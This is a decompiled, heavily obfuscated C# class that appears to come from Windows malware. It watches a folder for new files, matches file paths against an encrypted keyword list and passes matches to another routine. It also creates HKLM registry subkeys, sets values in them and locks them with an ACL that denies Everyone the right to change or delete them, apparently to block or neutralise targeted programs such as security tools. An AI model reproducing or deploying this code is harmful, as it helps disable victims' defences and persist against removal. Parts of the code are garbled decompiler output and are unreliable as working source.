using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.AccessControl;
using System.Security.Principal;

[StandardModule]
internal sealed class ____________________________________________________________
{
	[System.Runtime.CompilerServices.AccessedThroughProperty("SystemShield")]
	private static FileSystemWatcher _;

	public static string __;

	public static string ___;

	public static FileSystemWatcher _
	{
		get
		{
			return ____________________________________________________________._;
		}
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		set
		{
			FileSystemEventHandler value2 = new FileSystemEventHandler(____________________________________________________________._______);
			if (____________________________________________________________._ != null)
			{
				____________________________________________________________._.Created -= value2;
			}
			____________________________________________________________._ = value;
			if (____________________________________________________________._ != null)
			{
				____________________________________________________________._.Created += value2;
			}
		}
	}

	static ____________________________________________________________()
	{
		// Note: this type is marked as 'beforefieldinit'.
		____________________________________________________________._ = new FileSystemWatcher();
		int arg_7C_0 = System.Type.EmptyTypes.Length + 35646;
		int _____________ = <Module>.______________;
		____________________________________________________________.___ = <Module>.__________(arg_7C_0, ((_____________ % 32768 - 8859) * 64 - 191424 != ~(_____________ * 606656)) ? (System.Type.EmptyTypes.Length + 35488) : ((1879048192 + 1073741824 * _____________ == (int)((uint)_____________ >> 29)) ? (System.Type.EmptyTypes.Length + 767672879) : (sizeof(System.Guid) + -1581283094)), 157);
	}

	public static void ___(string string_0)
	{
		try
		{
			if (____________________________________________________________._____(string_0))
			{
				_________________________________________________.___________(string_0.ToString());
			}
		}
		catch (System.Exception arg_15_0)
		{
			ProjectData.SetProjectError(arg_15_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void ____(string string_0)
	{
		try
		{
			string[] directories = System.IO.Directory.GetDirectories(string_0);
			string[] array = directories;
			for (int i = 0; i < array.Length; i++)
			{
				string string_ = array[i];
				try
				{
					if (____________________________________________________________._____(string_))
					{
						_________________________________________________.___________(string_);
					}
				}
				catch (System.Exception arg_25_0)
				{
					ProjectData.SetProjectError(arg_25_0);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (System.Exception arg_39_0)
		{
			ProjectData.SetProjectError(arg_39_0);
			ProjectData.ClearProjectError();
		}
	}

	public static bool _____(string string_0)
	{
		bool result;
		try
		{
			string[] array;
			if (Operators.CompareString(____________________________________________________________.___, <Module>.__________(System.Type.EmptyTypes.Length + 4122, System.Type.EmptyTypes.Length + 6121, System.Type.EmptyTypes.Length + 46), false) == 0)
			{
				int num = -25394;
				if (sizeof(long) + -24915 != 25022)
				{
					result = false;
					return result;
				}
			}
			else
			{
				array = Strings.Split(____________________________________________________________.___, <Module>._____<string>(2815274875u), -1, CompareMethod.Binary);
				int num;
				if ((num * 4096 ^ 5668) != 0 && (-(num * 8192) ^ 6507) != 0)
				{
					int i;
					switch ((~(6510 + i / 381234) == 9304) ? (sizeof(uint) + 1850919753) : (sizeof(long) + -8))
					{
					}
				}
			}
			string text = Strings.StrConv(string_0.ToString(), VbStrConv.Lowercase, 0);
			string[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				string text2 = array2[i];
				try
				{
					if (Operators.CompareString(text2, <Module>.__________(System.Type.EmptyTypes.Length + 47130, System.Type.EmptyTypes.Length + 49350, 134), false) != 0 && text.Contains(text2))
					{
						result = true;
						return result;
					}
				}
				catch (System.Exception arg_122_0)
				{
					ProjectData.SetProjectError(arg_122_0);
					ProjectData.ClearProjectError();
				}
			}
			result = false;
		}
		catch (System.Exception arg_139_0)
		{
			ProjectData.SetProjectError(arg_139_0);
			result = false;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void ______()
	{
		try
		{
			____________________________________________________________.___ = __________________________________________________________________.____(<Module>.___<string>(2987481260u));
			____________________________________________________________._.Filter = <Module>.___<string>(4008727444u);
			____________________________________________________________._.NotifyFilter = NotifyFilters.FileName;
			____________________________________________________________._.Path = System.Environment.GetEnvironmentVariable(<Module>._______<string>(404507950u)) + <Module>.____<string>(2151898393u);
			____________________________________________________________._.IncludeSubdirectories = true;
			____________________________________________________________._.EnableRaisingEvents = true;
		}
		catch (System.Exception arg_73_0)
		{
			ProjectData.SetProjectError(arg_73_0);
			ProjectData.ClearProjectError();
		}
	}

	private static void _______(object sender, FileSystemEventArgs e)
	{
		int num;
		int num3;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_07:
			int num2 = 2;
			____________________________________________________________.___(e.FullPath);
			IL_14:
			goto IL_6F;
			IL_16:
			int arg_1B_0 = num3 + 1;
			num3 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_1B_0);
			IL_30:
			goto IL_64;
			num3 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_42:
			goto IL_64;
		}
		object arg_44_0;
		endfilter(arg_44_0 is System.Exception & num != 0 & num3 == 0);
		IL_64:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_6F:
		if (num3 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void ________(string string_0)
	{
		try
		{
			while (___________________________________________________________________.________())
			{
				Microsoft.Win32.RegistryKey registryKey;
				int num2;
				int arg_1B7_0;
				if (string_0.Contains(<Module>.___<string>(3175546013u)))
				{
					if (string_0.Contains(<Module>._____<string>(305124521u)))
					{
						string_0 = System.IO.Path.GetFileName(string_0);
						int num;
						if ((num - 862 & 1) != (1 & num))
						{
							continue;
						}
					}
					registryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(<Module>._______<string>(4102994385u), true);
					registryKey.CreateSubKey(string_0);
					num2 = System.Type.EmptyTypes.Length + 243;
					arg_1B7_0 = System.Type.EmptyTypes.Length + 0;
				}
				else
				{
					num2 = 6561;
					if (checked((int)(unchecked((System.IntPtr)2198))) != 17450)
					{
						break;
					}
					goto IL_A7;
				}
				Microsoft.Win32.RegistryKey registryKey2;
				System.Security.Principal.SecurityIdentifier securityIdentifier;
				while (true)
				{
					IL_1B7:
					switch (arg_1B7_0)
					{
					case 1:
						goto IL_1CF;
					case 2:
						goto IL_A7;
					}
					registryKey.Close();
					registryKey2 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(<Module>._____<string>(1224194589u) + string_0, true);
					if (num2 != 243)
					{
						break;
					}
					registryKey2.SetValue(<Module>.______<string>(97836900u), <Module>._______<string>(1744436544u));
					securityIdentifier = new System.Security.Principal.SecurityIdentifier(System.Security.Principal.WellKnownSidType.WorldSid, null);
					arg_1B7_0 = (((num2 / 517070 - 8388608 * num2 ^ 36694) != 0) ? (((-5238 | num2 * -188743680) != -5238) ? (System.Type.EmptyTypes.Length + -1825220696) : (((8388608u & (uint)num2 >> 9) != (uint)(num2 - (num2 - 3954) << 23 & 8388608)) ? (sizeof(long) + 1608578384) : 2)) : -664432083);
				}
				break;
				IL_1CF:
				System.Security.AccessControl.RegistrySecurity registrySecurity = new System.Security.AccessControl.RegistrySecurity();
				string identity;
				registrySecurity.AddAccessRule(new System.Security.AccessControl.RegistryAccessRule(identity, System.Security.AccessControl.RegistryRights.ExecuteKey, System.Security.AccessControl.InheritanceFlags.None, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Allow));
				registrySecurity.AddAccessRule(new System.Security.AccessControl.RegistryAccessRule(identity, System.Security.AccessControl.RegistryRights.SetValue | System.Security.AccessControl.RegistryRights.CreateSubKey | System.Security.AccessControl.RegistryRights.Delete | System.Security.AccessControl.RegistryRights.ChangePermissions | System.Security.AccessControl.RegistryRights.TakeOwnership, System.Security.AccessControl.InheritanceFlags.None, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
				registryKey2.SetAccessControl(registrySecurity);
				registryKey2.Close();
				break;
				IL_A7:
				System.Security.Principal.NTAccount nTAccount = securityIdentifier.Translate(typeof(System.Security.Principal.NTAccount)) as System.Security.Principal.NTAccount;
				identity = nTAccount.ToString();
				arg_1B7_0 = ((num2 / 32 == 1796913459) ? (System.Type.EmptyTypes.Length + 393597365) : (System.Type.EmptyTypes.Length + 1));
				goto IL_1B7;
				break;
			}
		}
		catch (System.Exception arg_212_0)
		{
			ProjectData.SetProjectError(arg_212_0);
			ProjectData.ClearProjectError();
		}
	}
}
